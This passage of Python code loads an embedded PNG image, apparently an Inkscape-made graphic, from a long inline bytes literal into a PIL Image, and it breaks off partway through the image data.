        image = Image.open(BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x02\x00\x00\x00\x02\x00\x08\x06\x00\x00\x00\xf4x\xd4\xfa\x00\x00\x00\tpHYs\x00\x00\x0e\xc3\x00\x00\x0e\xc3\x01\xc7o\xa8d\x00\x00\x00\x19tEXtSoftware\x00www.inkscape.org\x9b\xee<\x1a\x00\x00 \x00IDATx\x9c\xed\xddi\x9c\\e\x99\xfe\xf1\xeb>\xd5\xd5\x9d\x84t\x92\xeeNB\x00Y\x8c\x1b\xa3\xb2h\xdc\x90%\xd5\x04\xc1$\xdd\xb8M\\\xff\xea\xe8(n\xa32\xea\x08\x8e[\x1cu\x10\xc7m\xd4\xd1Qg@G\x99\x11\xa2\xa2\xe9\xeeD"I*A\x16E\x06\x01\xd7Q6\xc1\x90\xa5\x97\x90\x90\xa4\xb7:\xf7\xffE\x13\xc0\x84\x90TuU=u\xce\xf9}\xdf\xf01t\xaa\xae\xe0\xc9\xb9\xaf\xf3\x9cM\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\x88,t\x00\x00\xe5\xf1B\xa1i \x9a~xdQ\x87\x8d\x97:\xe2(\x9ac\xd2l\x8b\xe3\x8e\xd8\xac\xc3d\x1d\x92w\x98\xab\xc3M9IMr\xb5J\x92\xcc\xa6J>e\xe2\x834S\xa6HRI\xd2\x8e\x07\x7fm\x8f\xa4\xe1\x89\x9f\xd5\x8e\x89\x7fg\xe3r\x1fP\xa4\x01w\x1b\x88\xe4\x03\xee>\xe0f\xdb"\xa9\xdf\xe3x\xa0\xd4\xd240{V\xcb\x16[\xb1\xa2T\xf7\xff \x00*B\x01\x00\x1a\xd0\xf6\xd3\x96\xb6)\xaf\xf9\xa5X\xf3\xcd4_\x1e\xcd7\xf3\xf9\xee\x9a/\xd31\x92\x9aBg\xdc\x9f\x8dI\xea\x97|\x93\x99\xdd\xe1\xae;d\xf1\x1d\xb1\xeb\x8e\xa6&\xdd1\xb3m\xda\xdd\x14\x04\xa0qP\x00\x80\x80\x06\xcf\xea>F\xe3:Q\xee\'\xc8t\xd2\xc4?\xa3\'I\x9e\x0f\x9d\xad\xea\\\xa32\xfb\xbd\xdco\x93\xf9\xad\xf2\xe8V\xb7\xf1\xdb:\x8a\xab\xef\r\x1d\r\xc8"\n\x00P\x07\xbelYn{\xff\x9e\xa7\xbb\xfc\xb9r;Qn\'\xc8\xfcDI\xb3Bg\x0b\xce5(\xd3\xad2\xbb\xcd]\xb7\x9a\xe2\x1b\xda\x8a\xcf\xfe\x8diy\x1c:\x1a\x90f\x14\x00\xa0\x066\x9f}\xf6a\xcd\xa3-\xcf\x90\xe2S%;M\xd2\xa9\x92\xdaB\xe7J\x90\x9d&\xfd,\x96\xae5\xd7M\xca\x0fol\xbf\xfa\xea\xfbC\x87\x02\xd2\x84\x02\x00T\xc1\x8eE/\xe9\x18+\x8d\x9de\xd2\xdea\x7f\xa2\xa4\\\xe0Xi2n\xd2\xcd\xb1t\x9d\xcc\xae\x89<\xb7\xb6\xad\xf8\xc3\xed\xa1C\x01IF\x01\x00*\xe0Z\x1e\xdd\xdfy\xe33b\xd7Y&;\xcbe\x0bSy\xde\xbeq\x95$\xfdR\xb2\xab%\xf5\xb6\x15\x17\\\xc7)\x03\xa0<\x14\x00\xe0\x10\xedX\xf4\x92\x8e\xb1\xf1\xd13M\xd1Y\x92w\xc9td\xe8Lx\xc863+J\xde\x1b5\x8f\xf5\xce\xbc\xea\xaa\xc1\xd0\x81\x80FG\x01\x00\x1e\xc3\xb6\xd3\xcf9"\x97\xcb\xbfL\xd2+\xe4z\xfe\x83\xf7\xcd\xa3\xb1\x95$\xdb(\xf9\x15\xf9R\xe9\xfb\xad\xd7\xac\xde\x16:\x10\xd0\x88(\x00\xc0>\xee?\xe7\x9c\xf6x4\xdf\xe5\xaee\x92^\xa8\x86\xbc\xe7\x1e\x87\xa8$\xf9\r&[\xd1\xd4\x9c\xff\x9f\xd65Wn\r\x1d\x08h\x14\x14\x00@{\x97\xf7\xc7^\x1a\x99^\xeeR\xa7\xb8\x80/\x85lL\xd2Z\x93.\x97r?\xe4"Bd\x1d\x05\x00\x99\xe5\x92\r\x15\xbaO\x95\xeb\xb52\x7f\xad\xa4\xa9\xa13\xa1nF\xccle\xc9\xe3\xafw\x14\xfb\xd6\x9a\xe4\xa1\x03\x01\xf5F\x01@\xe6l-,\x99\xd7${\xbd\x14\xbdY\xf2\'\x84\xce\x83\xb0\xcc\xf5\x7fn~I\xbe\xb9\xf9RN\x11 K(\x00\xc8\x04\xd7\xf2h\xa0p\xe3\x999\x8b\xces\xd7\x8b\xb9e\x0f\xfbq\x8d\xca\xb4\xc6\xdd\xff\xab}\xee\xb4\x1f\xf0\xde\x02\xa4\x1d\x05\x00\xa96\xb0x\xf1\x0c\r\xe7\xded\xaewI:6t\x1e$\x85\xdd.\xf9\x17F\x9bG/\x9d\xb7f\xcd\xae\xd0i\x80Z\xa0\x00 \x95\xb6\x16\x96\xcc\xcb)z\xabI\xef\x12\x8f\xe0E\xa5\\;\\\xfa\xa6\xac\xf4/\xbc\xb4\x08iC\x01@\xaa\x0cuv\x9d\xe4\xd2{\xe5\xf6J\x96\xf9Q5\xaeQE\xba\\\xee\x9fn/\xf6\xfd*t\x1c\xa0\x1a(\x00H\x85\x81\xc2\x92\x17J\xd1\xfbLZ\x14:\x0bR\xcd%\xfd\xd8\xdc\xff\xa5mC\xdf\xfa\xd0a\x80\xc9\xa0\x00 \xd1\x06\x0b\xdd\xa7I\xfe\tI\x0bCgA\xd6\xf8\xb5Q\x14}d\xd6\xba\x9eu\xa1\x93\x00\x95\xa0\x00 \x91\x06\xce\\\xfa|\x95\xec\xe3f:3t\x16d\x9d_k\x91\xffc\xdb\xbaU\x1bC\'\x01\xcaA\x01@\xa2\xf4w.yn\xe4\xd1\x87$u\x85\xce\x02<\x92IW\x9b\xe2\x0f\xcc*\xae\xfaE\xe8,\xc0\xa1\xa0\x00 \x11\x86\nKNvE\x1f\x17\x83\x1f\x8d\xcdM\xfaA\x9c\xcb}\xa4c\xed\x8f~\x13:\x0c\xf0X(\x00hh\x0f>\xa3\xff#fz\x87x>?\x92c\\n\x97\xe4\xe3\xf1\x0f\xf16B4*\n\x00\x1a\x92/X\x90\xdf\xdez\xc4\xdb]\xf61\xc9g\x86\xce\x03ThH\xf2\x8b\xdb\xe6L\xfb\xbc\xadX1\x1a:\x0c\xf0H\x14\x004\x9c\xfe\xc2\xd2\xb3"\xd7\xbf\xca\xec\xa9\xa1\xb3\x00U\xf2{\x99\xbf\xb7}}__\xe8 \xc0^\x14\x004\x8c\xfeB\xf7\xf1\x91\xfcs\x92\x16\x87\xce\x02\xd4\x82IW\xc7f\xe7w\xac\xef\xf9u\xe8,\x00\x05\x00\xc1m\xea\xee\x9e6eg\xfc1\xc9\xce\x97\xd4\x14:\x0fPS\xaeQ7]\xd4>\xb5t\x91\xad^=\x12:\x0e\xb2\x8b\x02\x80\xa0\x86\xce\\r\x86\xc7\xd1\xd7%=%t\x16\xa0\xce\xfeh\xee\xe7\xf1DA\x84B\x01@\x10C\x85\x17\xcfr/],\xf37\x8b\xed\x10\xd9\xe5r\xfb\x86O\x1b\xff\x87\x8e\xd5\xabw\x84\x0e\x83la\xc7\x8b\xba\x1b\\\xd8\xd5-\xd3W%\x1d\x15:\x0b\xd0\x18\xec>\xb3\xf8\xef\xda\xd6\xf7\xfd t\x12d\x07\x05\x00u\xb3\xed\x05\xe7\x1e\x99\x1b\x8d\xbf*\xd3\xb9\xa1\xb3\x00\r\xea\xf2|\xa9\xf4N\x9e\x1d\x80z\xa0\x00\xa0.\x86\x16v\xbd\xc4M\xdf\x90\xd4\x11:\x0b\xd0\xc8\xdc\xb5\xd5\xcc\xfe\xb6\xbd\xd8\xd3\x1b:\x0b\xd2\x8d\x02\x80\x9a\xba\xe7\x94eS\xa75\xef\xf9\x94\x99\xde\x15:\x0b\x90 .\xb7o\x0c\xcf\xd0\xdf\x1f\xd9\xd3\xb3;t\x18\xa4\x13\x05\x005\xb3\xbd\xb0\xe4Y\xee\xd1enzr\xe8,@"\xb9\xff\xc6\xcc_\xd3V\\\xf5\xcb\xd0Q\x90>Q\xe8\x00H\x1f\x97l\xa8\xd0\xf5\xee\xd8\xa3k\x19\xfe\xc0$\x98=\xd5\x15]?XXz\x81k9\xfbkT\x15+\x00\xa8\xaa\xc1\xb3\xba\x8f\xd1\x98\xbe-\xf33Bg\x01R\xe6\xaa\xb1\\\xf4\xfa\xc3\xd7\xae\xdc\x12:\x08\xd2\x81\x02\x80\xaa\x19\xea\xec^(\xf7\xcb]:<t\x16 \x95\\\x9b<\xe7\xcb:\xd6\xf5]\x17:\n\x92\x8f%%L\xda\xde%\x7fw\xbf\x9a\xe1\x0f\xd4\x90\xe9H\x8bm\xc3`a\xe9\x05\xa1\xa3 \xf9X\x01\xc0\xa4l-,\x9b\x9e\xb7\xe1K\xdc}Y\xe8,@\xc6\\6\xdcj\xe7q\x97\x00*E\x01@\xc5\xb6-Z\xf2\xe4\\)\xfa\x81\xa4\xa7\x85\xce\x02d\xd4-Q\x93\xbft\xd6\xd5}w\x84\x0e\x82\xe4\xe1\x14\x00*2\xb8\xb0\xab;W\xca\xfd\\\x0c\x7f \xa4\x93\xe21\xbby\xa8\xb3\xfbE\xa1\x83 y(\x00(\x8bK6\xd4\xd9\xfd\x11\x99~$\xf9\xcc\xd0y\x80\xcc3\xcd\xf0\xd8\x7f0\xd0\xd9\xf5\x9e\xd0Q\x90,\x9c\x02\xc0!\xf3B\xa1i\xc8[\xffM\xe6\xe7\x85\xce\x02`\x7f&\xfd\xc7,=\xf06+\x16\xc7CgA\xe3\xa3\x00\xe0\x90l;\xf5\xdc\xd6\\\xde\xaf\x90\xfc\x85\xa1\xb3\x00xLW\xf9\xd4\xd2\xcby\xbd0\x0e\x86\x02\x80\x83\xea?\xb3\xeb\xa8(V\xaf\xa4\x93Cg\x01p\x08\\\xb7\xba\x95\x96v\x14W\xdf\x1b:\n\x1a\x17\x05\x00\x8fi\xa8\xb3\xeb$w\xf5Jz\\\xe8,\x00\xca\xf2gS\xdc\xc5{\x04p \\\x04\x88\x03\x1a\\\xd8\xd5\xed\xaek\xc5\xf0\x07\x92\xe8(W\xae\xb8\xbd\xb3kQ\xe8 hL\x14\x00<\xaa\xc1\xc2\xd2W\xca\xec\xfb\x92\x0e\x0b\x9d\x05@\xa5|f\x1ck\xd5P\xe7\xd2\x97\x86N\x82\xc6C\x01\xc0~\x06\x16v\xbdYn\x97I\x9e\x0f\x9d\x05\xc0$\x99\x9a\xdd\xed\x8a\xa1\xc2\xd2\xd7\x87\x8e\x82\xc6B\x01\xc0_\x18\xec\xec~\xbbI\xff.c\xdb\x00R$\xe7n\x97\x0c\x14\xba\xdf\x14:\x08\x1a\x07;y<d\xb0\xb0\xf4\x02\xb9\xff\x1b\xc3\x1fH!Sd\xf2\xaf\x0f,\xec\xfe\xfb\xd0Q\xd0\x18\xd8\xd1C\x924P\xe8Z.\xd9\xa7B\xe7\x00PSf\xe6\x9f\x1b,t\xf3w\x1d\xdc\x06\x98u.\xd9`\xa1\xeb\xf3&\xbd;t\x16\x00ud\xba\xa8}}\xef?\x86\x8e\x81pX\x01\xc8\xb8\xa1B\xf7E\x0c\x7f \x83\\\x1f\x98X\xf9CVQ\x002l\xe2/\xbf_\x10:\x07\x800L\xfa\xe8`a)\xfb\x80\x8c\xe2\x14@F\r\x15\x96\x9e\xef\xb2\xcf\x87\xce\x01 8\x97\xfb;\xda7\xf4}5t\x10\xd4\x17\x05 \x83\x06:\x97\xbe\xd1\xdc\xfeC\xfc\xff\x0f`\x82\xbb\xec\xcd\x1d\xc5\x9e\xff\x0c\x1d\x04\xf5\xc3\x00\xc8\x98\xa1\xce\xae\xd7y\xacK\xb9\xd5\x0f\xc0>J.\xbd\xa6\xa3\xd8{y\xe8 \xa8\x0f\n@\x86\x0c,\\\xba\xcc\xcc\xfeGR.t\x16\x00\r\xc85\xaaH/i_\xdf\xbb*t\x14\xd4\x1e\x05 #\x86\xce\\r\x86\xc7\xd1\x1aI-\xa1\xb3\x00hh{\xdc\xb5\xa8cC\xef\xf5\xa1\x83\xa0\xb6(\x00\x19\xd0\x7f\xc6\xd2\xbf\x8a"\xbbVR[\xe8,\x00\x12\xa1?\xa7\xe8\x94\x99\xc5\x95\x7f\x0c\x1d\x04\xb5\xc3y\xe0\x94\xdbQ\xe8\x9e\x1dE\xb6R\x0c\x7f\x00\x87nvIq\xcf\xf6\xd3\x96\xb2\xdfH1\n@\x8a\xdds\xca\xb2\xa9\xe3\xf2\x1eIO\x0c\x9d\x05@\xe2\x1c\x1f\xe7\xa2\x1f\xfa\xe2\xc5\x9c6L)\n@J\xb9\x96G\xd3Z\xf6\\&\xe9y\xa1\xb3\x00H(\xf33\x86\xf6\xe4\xbe\xe9\x9c.N%\n@J\r\x16n\xfa\xacI/\t\x9d\x03@\xe2\xbdrp\xe1\xd2\xe5\xa1C\xa0\xfahu)4X\xe8z\x87\xa4/\x87\xce\x01 =\xcc\xf4\xfa\xb6\xf5\xbd\xff\x15:\x07\xaa\x87\x02\x902\x03\x0b\xbbN1\xa9(Ss\xe8,\x00Re8R|\xfa\xac\xe2\xaa_\x84\x0e\x82\xea\xa0\x00\xa4\xc8\xd6\xc2\x92yM\x1e\xdd$\xd3\x91\xa1\xb3\x00H!\xd7\x9f\x9a\xcc\x16\xcc(\xf6\xf4\x87\x8e\x82\xc9\xe3\x1a\x80\x94\xf0\x05\x0b\xf2M\x8a\xae`\xf8\x03\xa8\x19\xd31c\xf2\xef\xfa\xb2e<M4\x05(\x00)1\xd4z\xc4\xe7%\x9d\x1e:\x07\x80t3i\xd1\xd0\xb6\xdd\x1f\x0b\x9d\x03\x93\xc7)\x80\x14\x18\xec\xec~\xb5\xdc/\x0b\x9d\x03@f\xb8\x9b-\xebX\xdf\xf3\xfd\xd0AP9\n@\xc2\r.:\xf7D\x8d\xc7\xd7\xcb4-t\x16\x00\x99\xb23\x8e\xfd\xb9\xb37\xf6\xfd6t\x10T\x86S\x00\t6\xb0x\xf1\x0c\x95\xfc\x07\x0c\x7f\x00\x01\xb4FQt\xf9\x9d\x85\xc2\x94\xd0AP\x19\n@\x82\xd9\xee\xdc\x97$\x7fB\xe8\x1c\x00\xb2\xcaO\x98\xe1\xd3/\x0e\x9d\x02\x95\xe1\x14@B\rtv\xbf\xcc\xdc\xbf\x17:\x07\x80\xccs\xc9\xcem/\xf6\xf4\x86\x0e\x82\xf2P\x00\x12h\xa0\xb0\xf8q\xe6\xb9[dj\x0f\x9d\x05\x00\xdc\xb5\xb5d\xf1Is\x8b\xab6\x87\xce\x82C\xc7)\x80\x84q-\x8f\xe4\xb9o1\xfc\x014\n3\xcdmR\xeeR^\x1a\x94,\x14\x80\x84\x19Z\xf8\x8b\x0b\xcctf\xe8\x1c\x00\xf0\x97\xfc\x85C\x9d\xddo\x0b\x9d\x02\x87\x8e\xb6\x96 \xdb\xcf\xec~f\\\xf2\xeby\xce?\x80\x065\xac8~N\xfb\xc6U\xb7\x85\x0e\x82\x83c\x05 !\xee,\x14\xa6\xc4\xb1_\xc6\xf0\x07\xd0\xc0\xa6(\x8a\xbe\xe5\x85BS\xe8 88\n@B\xcc\xf4\xd6\x0fK:>t\x0e\x008\x88g\x0c\xa9\xf5}\xa1C\xe0\xe08\x05\x90\x00\x83g,9AQ\xee&\xc9\xf3\xa1\xb3\x00\xc0!\x18\x89e\'\xcf.\xf6\xfc.t\x10\x1c\x18+\x00\r\xce\xb5<R\x14}\x8d\xe1\x0f AZ"\xf9\xbfsW@c\xa3\x004\xb8\xc1\xc2\x8d\x7f/\xe9\x94\xd09\x00\xa0L\x0b\x07\x0b\xdd\x7f\x1b:\x04\x0e\x8cv\xd6\xc0\x86\xce\\r\xac\xc7\xd1\xaf$M\x0f\x9d\x05\x00\xcag\xf7\xc7\x91?m\xf6\xba\xde?\x87N\x82\xfd\xb1\x02\xd0\xc0\xbc\x14}]\x0c\x7f\x00\x89\xe53s\xb1\xbe\x10:\x05\x1e\x1d\x05\xa0A\ruv\xbdN\xa6\xb3C\xe7\x00\x80\xc9p\xe9\xaf\x87:\xbb_\x14:\x07\xf6\xc7)\x80\x06\xb4\xed\xd4s[sy\xff\xbd\xe4G\x84\xce\x02\x00Up\xe7\xfdz\xe0\xa9\x8f/\x16\x87C\x07\xc1\xc3X\x01h@\xb9\xbc\x7f\x90\xe1\x0f E\x1e?S\xad\xe7\x87\x0e\x81\xbf\xc4\n@\x83\xd9~\xd6\xd2\xf9\xf1\xb8\xfdZ\xd2\x94\xd0Y\x00\xa0\x8a\x1e(\xe5\xa3\xa7\xcc\xf9\xc9\xcaM\xa1\x83`\x02+\x00\r\xa64n\x9f\x11\xc3\x1f@\xfaL\x8f\xc6J\x9f\x0c\x1d\x02\x0fc\x05\xa0\x81\x0c-\\\xda\xe9f\xebB\xe7\x00\x80\x9ap\xc5qN\xa7\xcc^\xd7\xfb\xf3\xd0Q\xc0\n@\xc3\xf0e\xcbrn\xf6\xf9\xd09\x00\xa0fLQ\x14\xeb\x0b<!\xb01P\x00\x1a\xc4\xd0\xb6\xe17I:)t\x0e\x00\xa8\xb1S\x86\nK_\x11:\x04ha\ra\xf3\xd9g\x1f\xd62\xda|\xbbK\x87\x87\xce\x02\x00upw\xdb\x9c\xa9O\xb6\x15+FC\x07\xc92V\x00\x1a@\xf3h\xcb;\x19\xfe\x002\xe4\xd8\xa1\xad\xbbyO@`\xac\x00\x04\xb6\xb5\xb0lz\x93\xf6\xdc!iN\xe8,\x00P?v\xdf\xae\x91)O8\xfa\xfa\x15{B\'\xc9*V\x00\x02\xcbk\xcf{\xc5\xf0\x07\x909~\xc4\xf4\x96\xddo\t\x9d"\xcbX\x01\x08h\xa8\xf0\xe2Y\xae\xf1;$\xb5\x85\xce\x02\x00\x01l\x1b\xd7\xd4\xf9s\x8b+\x1e\x08\x1d$\x8bX\x01\x08\xc8\xbd\xf4\x0fb\xf8\x03\xc8\xae9M\xb6\xe7\xed\xa1Cd\x15+\x00\x81\xec(t\xcf\x1e\x97\xdf!\xa95t\x16\x00\x08h\xc0\xa7\x96\xe6w\xac^\xbd#t\x90\xaca\x05 \x90q\xc5\x17\x88\xe1\x0f\x00\x1d\xd1\xee\xe8\xdd\xa1Cd\x11+\x00\x01l?mi[\xdcd\x7f\x924=t\x16L\xb0\xe9\x87)w\xdc\xd1\x8a\x8e\x98\xadh\xe6\x0c\xc9&\xba\xb1?\xb0K\xf1\xd6~\x95\xee\xb9O\xf1\xd6\xfe\xc0)q(\xa2\xb9\xb3\x95;\xfa\x08E\x87\xcf\x96\x1dv\xd8\xc4/\xc6%\xc5\xf7\xefT\xbcy\x9bJw\xdd+\x7f`W\xd8\x90\xf8K\xae\xc1q\x9bz,\xd7\x02\xd4WS\xe8\x00Y\x14\xe7\xf569\xc3?\xb4\xdc\xfcc\xd5\xdc\xf9<\xe5\x9fu\xa2r\xc7\x1e%\xd9c\xf7\xe1\xb8\x7fP\xe37\xffF\xa3\x1b\x7f\xa6\xb1\x9b\x7f-\x95JuJ\x8a\xc7\x94\xcb)\xff\xcc\xa7\xa9\xf9\x8c\xe7\xaa\xe9\x19OS\xd4q\x90\xcbjbW\xe9\xee{5\xf6\x8b[4Z\xfc\x99Jw\xfc\xa9>9q`\xa6\xf6&\xed\xf9\x1bI_\x0e\x1d%KX\x01\xa83_\xbc\xb8ehO\xd3\x9d\x92\x1f\x11:KV\xe5Oy\x86\xa6,\xebR\xd3_=\xb1\xe2\xcf\x88\xb7\xf6k\xf8\xca\xab4\xbaz\xbd|d\xac\x8a\xe9p\xa8\xac\xa5Y-K:\xd5\xf2\x92s\x14\xcd\xe9\xa8\xf8s\xc6\x7f\xf3\x07\r\xaf\xe8\xd3\xd8\r7W1\x1d*pg\xdb\x9c\xa9O\xb2\x15+h\xd6uB\x01\xa8\xb3\x81\xce\xa5o4\xb7\xff\x0c\x9d#\x8br\xc7\x1e\xa5io\x7f\x9d\x9aN<\xbej\x9f\x19o\xe9\xd7\xee\xaf}Gc\xd73<\xea)\xff\xfc\x05\x9a\xf6\x96W+\x9a;\xbbj\x9f9~\xcbo\xb5\xfb+\xff\xa5\xd2\x9fx]}(.-\xeb(\xf6~/t\x8e\xac\xa0\x00\xd4\xd9\xe0\xc2\xae[d:1t\x8e\xaci^t\xaa\xa6\xbd\xf3od-\xcd5\xf9\xfc\xd1\xb5\xd7i\xf7\x97\xbf)\x1f\x1e\xa9\xc9\xe7c\x82\xb5\xe45\xf5\r\xafP\xcb\x8b^P\x93\xcf\xf7\xd11\xed\xb9\xf4\n\x8d\xfcpMM>\x1f\x8f\xcd\xa4\x1b\xdb\x8a\xbd\xcf\t\x9d#+(\x00u4\xb8\xb0{\xb1\xccW\x85\xce\x91)Q\xa4i\xefx\x9dZ\x96t\xd6\xfc\xabJ\x7f\xbcK;?\xf4\x19\xf9\xfd;k\xfe]Y\x14\xcd\x9a\xa1\xe9\x9fx\x9frO8\xb6\xe6\xdf5\xfa\x93\x9fj\xd7\xbf^\xc2u\x1e!XtZ\xfb\xfa\x95\xd7\x86\x8e\x91\x05\xdc\x06XGn\xfe\xde\xd0\x192%\x8at\xd8\x85o\xab\xcb\xf0\x97\xa4\xdc\x13\x8f\xd3\x8c\xcf}D\xd1\x9c\xf6\xba|_\x96Ds\xda\xd5\xfa\xd9\x0f\xd7e\xf8KR\xf3\x0bN\xd3a\x17\xbcU\x8a\xd8E\xd6\x9b{\xcc~\xb2NX\x01\xa8\x93\xa1\xce\xae\x93\xdc\xf5\xcb\xd09\xb2d\xda\xbb\xde\xa0\x96\xc5\x85\xba\x7fo\xbcy\xabv\xbe\xff"\xc5\xdb\x06\xeb\xfe\xddi\x14\xcdiW\xeb\xa7?\xa0h\xde\xdc\xba\x7f\xf7\xc8\xaa\xf5\xda\xfd\xa5o\xd6\xfd{3\xcd\x15\xe7\\\xc7\xcf\xdc\xd8\xfb\x87\xd0Q\xd2\x8ez[\'.\xbd#t\x86,i\xe9^\x14d\xf8KR4o\xaeZ?\xf3AE\xf3x\xc7\xd3dEs\xda\xd5z\xf1\x85A\x86\xbf\xa4\x89\xbb\x0c\xea\xb4\x82\x84\x07\x99\xa2\xd8\xf4\xd6\xd01\xb2\x80\x02P\x07[\x0b\xcb\xa6+\xd6+B\xe7\xc8\x8a\xdc\xb1Gi\xea\x9b^\x154C4w\xb6Z/z?\xa7\x03&\xe1\xa1#\xff#\x0e\x0f\x9ac\xeay\xafQ\xee\x98#\x83f\xc8\x1a7\xbd\xde\x17/n\t\x9d#\xed(\x00u\x90\xf3=\xaf\x92iF\xe8\x1cY1\xedm\xaf\x955\xe7C\xc7`%`\x12B\x1f\xf9?\x92\xb5\xe45\xedm\xaf\r\x1d#k:\x06\xf7\xe4^\x1c:D\xdaQ\x00\xea 2\xbd9t\x86\xac\xc8\x9f\xf2\x0c5\x9d\xf4W\xa1c<\x84\x95\x80\xf25\xca\x91\xff#5\x9d\xfcT\xe5\x9fsr\xe8\x18Y\xc3~\xb3\xc6(\x0056\xb8\xe8\xdc\x13]zv\xe8\x1cY1eYW\xe8\x08\xfba%\xe0\xd05\xd2\x91\xff\xbe\xa6,[\x12:B\xa6\x98t\xe6\xfd\x85s+\x7f\\\'\x0e\x8a\x02Pk\xa5\xf8\xbc\xd0\x11\xb2"7\xff\xd8I=\xde\xb7\x96X\t8\xb8F<\xf2\x7f\xa4\xa6\xa7?E\xb9\xc7\x1f\x1d:F\x96X\xc9\xfd\r\xa1C\xa4\x19\x05\xa0\x86\xee9e\xd9TI\xaf\x0e\x9d#+\x9a;\x9f\x1b:\xc2c\x8a\xe6\xcd\x9d\x18p\x94\x80\xfd\x84\xbc\xd5\xaf\x1c\xcd\x0b\x9f\x17:B\xb6\x98\xbf\xd1\x17,\x08\x7fAOJQ\x00jh\xfa\x94=\xcb$\x1d\xe4\xd5d\xa8\x96\xfc\xb3N\n\x1d\xe1\xa08\x1d\xb0\xbfF^\xf6\xdfW\xfeY\'\x84\x8e\x905\xf3\xb6\xcf8\x92s/5B\x01\xa8\xa18\xd6\xebCg\xc8\n\x9b>}\xe2\x95\xbe\t\xc0\xe9\x80\x875\xfa\xb2\xff\xber\x8f?Fv\xd8\xb4\xd012\xc5\xdd\xff&t\x86\xb4\xa2\x00\xd4\xc8\x96E\xe7\x1en\xa6\x85\xa1sdE\xee\xb8\xa3$K\xce\x83-Y\tH\xd6\x91\xffC"\xe3\x99\x00\xf5\xb7x\xf0\xac\xb3f\x86\x0e\x91F\x14\x80\x1a\xc9\x97\xe2\xbf\x96\x94\x0b\x9d#+\xa2#\x134D\x1e\x94\xe5\x95\x80\xa4\x1d\xf9?Rtd\xf22\'\\\x8b\x8dM=7t\x884\xa2\x00\xd4\x8a\xdb\xcbCG\xc8\x92h\xfa\xf4\xd0\x11*\x92\xc5\x95\x80D\x1e\xf9?\x82\xb5&s[K27g\x7fZ\x03\x14\x80\x1a\xd8v\xfa9G\xc8\xfc\xd4\xd092\xa5%\xb9\x17\ngi% \xc9G\xfe{\xd9\x94\xe6\xd0\x112\xc8\xce\xb9\xff\x9cs\xd2\xff\x17\xa4\xce(\x005\xd0\x94\xcb\xbf\\,\xff\xd7\xd7X\xb2\xdf\xdb\x9e\x85\x95\x80\xa4\x1f\xf9?dl<t\x82\x0c\xf2|<\x9c\x7fQ\xe8\x14iC\x01\xa8\x01w\xb1\\Ug\xbegO\xe8\x08\x93\x96\xe6\x95\x804\x1c\xf9\xef\xe5\xbb\x93\xbf\xad%\x91\x1b\xa7U\xab\x8d\x02Pe\x03g\xbc\xe8h\x99N\t\x9d#k\xe2\xcd\xdbBG\xa8\x8a4\xae\x04\xa4\xe6\xc8\xffA\xa5\xfb\xb6\x86\x8e\x90Q~\xd6\xce\xd3\x17\xa7\xe7/F\x03\xa0\x00TY\x14\x8d\xbfLRr\xeeGK\x89\xd2=\xf7\x85\x8eP5iZ\tH\xd3\x91\xff^\xf1\xbd\x9bCG\xc8\xaa\xa6\xd1\\\x13w\x03T\x11\x05\xa0\xfaxjU\x00\xf1\xd6~\xc5\xdb\x06C\xc7\xa8\x9a4\xac\x04\xa4\xed\xc8_\x92\xe2-\xfd\x8a\xfb\xd3\xb3\x9d%M$_\x1c:C\x9aP\x00\xaah\xf3\xd9g\x1f\xe6\xb2\xd3C\xe7\xc8\xaa\xf1_\xfe&t\x84\xaaJ\xf2J@\x1a\x8f\xfc%i,e\xdbX\xd2\xb8\xeb\x05\xbc\x1b\xa0z(\x00U\xd4<\xda\xd2)iJ\xe8\x1cY5\xba\xf1g\xa1#T]\x12W\x02\xd2x\xe4\xbf\xd7h\xf1\xfa\xd0\x11\xb2\xcd4c\xfb\xcc\xc3\xb9\xc6\xaaJ(\x00\xd5\xe41\xcbS\x01\x8d\xdd\xfck\xc5[\xfbC\xc7\xa8\xba$\xad\x04\xa4\xf5\xc8_\x9a\xb8\xd0t\xfc\xd6\xdf\x85\x8e\x91y\xee\xd1\x0bCgH\x0b\n@5YtN\xe8\x08\x99V*i\xf8\xca5\xa1S\xd4D\x12V\x02\xd2|\xe4/I\xc3\xdf_-\xc5q\xe8\x18pQ\x00\xaa\x84\x02P%\xdb:\xcf}\x8a\xe4O\x08\x9d#\xebFW\xafK\xcd-\x81\xfb\x8a\xe6\xce~p\xc06^\txh\xf8\xa7\xf0\xc8_\x92\xe2\xfb\xb6ht\xcd\xc6\xd010\xe1\xe4m/8\x9772U\x01\x05\xa0J\x9a\xbc\xc4\xf2\x7f\x03\xf0\x911\xed\xfe\xfae\xa1c\xd4L#\x9e\x0eH\xf3\xb2\xff^\xbb\xbf\xf6\xdf\xf2\xd1\xb1\xd010\xc1\x9a\xc6\xfc\xec\xd0!\xd2\x80\x02P%.cY\xaaA\x8c]\x7f\xb3F\xaeJ\xef\xd1Z#\x9d\x0eH\xfb\xb2\xbf$\x8d\xacZ\xaf\xb1\x9f\xfd2t\x0c<\x82\xcb\xd9\xdfV\x01\x05\xa0\n|\xc1\x82\xbc\\\xdc\xfe\xd7@\xf6|\xf5\xdb*\xfd\xf1\xae\xd01j\xa6\x11V\x02\xb2p\xe4?\xfe\x7fwjO\x8aW\x94\x12l\x91\xf3\xc0\xb5I\xa3\x00T\xc1\xc0\xcc#\x9e!\xd3\xb4\x